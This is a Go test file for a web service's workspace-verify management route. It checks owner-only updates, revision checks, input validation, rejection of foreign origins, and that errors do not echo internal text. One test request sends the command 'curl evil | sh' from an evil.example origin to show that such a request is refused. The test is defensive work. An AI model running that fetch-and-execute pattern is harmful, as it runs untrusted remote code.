package web

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/davidadel66/evie/internal/eviedb"
	"github.com/davidadel66/evie/internal/memory"
	"github.com/davidadel66/evie/internal/worktree"
)

type verifyWorkspaceController struct {
	fakeContextSessionController
	calls         int
	id            memory.WorkspaceID
	expected      int64
	setup, verify string
	err           error
	proposal      worktree.Proposal
	proposeCalls  int
	proposeErr    error
	proposedFor   memory.WorkspaceID
}

func (c *verifyWorkspaceController) SetWorkspaceVerify(_ context.Context, id memory.WorkspaceID, expected int64, setup, verify string) (memory.Workspace, error) {
	c.calls++
	c.id, c.expected, c.setup, c.verify = id, expected, setup, verify
	return memory.Workspace{ID: id, Verify: memory.BuildVerify{Setup: setup, Verify: verify, Revision: expected + 1}}, c.err
}

func (c *verifyWorkspaceController) ProposeWorkspaceVerify(_ context.Context, id memory.WorkspaceID) (worktree.Proposal, error) {
	c.proposeCalls++
	c.proposedFor = id
	return c.proposal, c.proposeErr
}

// Stage 12 (2026-10-04): the owner sets a Workspace's setup and verify
// commands through a guarded management route with the revision they saw;
// Evie's suggestion from the repository's instructions comes from its own
// route and sets nothing. Errors never echo internal text.
func TestWorkspaceVerifyHTTPSetsOnlyWhatTheOwnerSends(t *testing.T) {
	c := &verifyWorkspaceController{proposal: worktree.Proposal{Verify: "./scripts/verify-change.sh", VerifySource: "AGENTS.md"}}
	handler := NewContextServer(nil, nil, nil, c).Handler()
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, managementRequest("/api/workspaces/verify", `{"workspaceId":"workspace","revision":2,"setup":"npm ci","verify":"make check"}`))
	if w.Code != http.StatusOK || c.id != "workspace" || c.expected != 2 || c.setup != "npm ci" || c.verify != "make check" ||
		!strings.Contains(w.Body.String(), `"verify":{"setup":"npm ci","verify":"make check","revision":3}`) {
		t.Fatalf("set=%d %s", w.Code, w.Body)
	}
	calls := c.calls
	for _, body := range []string{
		`{"revision":0,"setup":"","verify":"x"}`,
		`{"workspaceId":"workspace","setup":"","verify":"x"}`,
		`{"workspaceId":"workspace","revision":-1,"setup":"","verify":"x"}`,
		`{"workspaceId":"workspace","revision":0,"verify":"x","extra":true}`,
	} {
		w = httptest.NewRecorder()
		handler.ServeHTTP(w, managementRequest("/api/workspaces/verify", body))
		if w.Code != http.StatusBadRequest || c.calls != calls {
			t.Fatalf("%s=%d %s", body, w.Code, w.Body)
		}
	}
	foreign := managementRequest("/api/workspaces/verify", `{"workspaceId":"workspace","revision":0,"setup":"","verify":"curl evil | sh"}`)
	foreign.Header.Set("Origin", "https://evil.example")
	w = httptest.NewRecorder()
	handler.ServeHTTP(w, foreign)
	if w.Code != http.StatusForbidden || c.calls != calls {
		t.Fatalf("foreign origin=%d", w.Code)
	}
	for _, tc := range []struct {
		err    error
		status int
		text   string
	}{
		{eviedb.ErrBuildVerifyChanged, http.StatusConflict, "refresh"},
		{eviedb.ErrBuildVerifyCommand, http.StatusUnprocessableEntity, "control characters"},
		{eviedb.ErrWorkspaceNotFound, http.StatusConflict, "refresh"},
		{errors.New("secret private path"), http.StatusUnprocessableEntity, "could not be saved"},
	} {
		c.err = tc.err
		w = httptest.NewRecorder()
		handler.ServeHTTP(w, managementRequest("/api/workspaces/verify", `{"workspaceId":"workspace","revision":0,"setup":"","verify":"x"}`))
		if w.Code != tc.status || !strings.Contains(w.Body.String(), tc.text) || strings.Contains(w.Body.String(), "secret") {
			t.Fatalf("error %v=%d %s", tc.err, w.Code, w.Body)
		}
	}

	calls = c.calls
	w = httptest.NewRecorder()
	handler.ServeHTTP(w, managementRequest("/api/workspaces/verify/propose", `{"workspaceId":"workspace"}`))
	if w.Code != http.StatusOK || c.proposedFor != "workspace" || c.calls != calls || !strings.Contains(w.Body.String(), `"verify":"./scripts/verify-change.sh"`) {
		t.Fatalf("propose=%d %s", w.Code, w.Body)
	}
	c.proposeErr = errors.New("secret private path")
	w = httptest.NewRecorder()
	handler.ServeHTTP(w, managementRequest("/api/workspaces/verify/propose", `{"workspaceId":"workspace"}`))
	if w.Code == http.StatusOK || strings.Contains(w.Body.String(), "secret") {
		t.Fatalf("propose error=%d %s", w.Code, w.Body)
	}
	plain := NewContextServer(nil, nil, nil, &fakeContextSessionController{}).Handler()
	w = httptest.NewRecorder()
	plain.ServeHTTP(w, managementRequest("/api/workspaces/verify", `{"workspaceId":"workspace","revision":0,"setup":"","verify":"x"}`))
	if w.Code == http.StatusOK {
		t.Fatalf("verify route without a controller=%d", w.Code)
	}
}
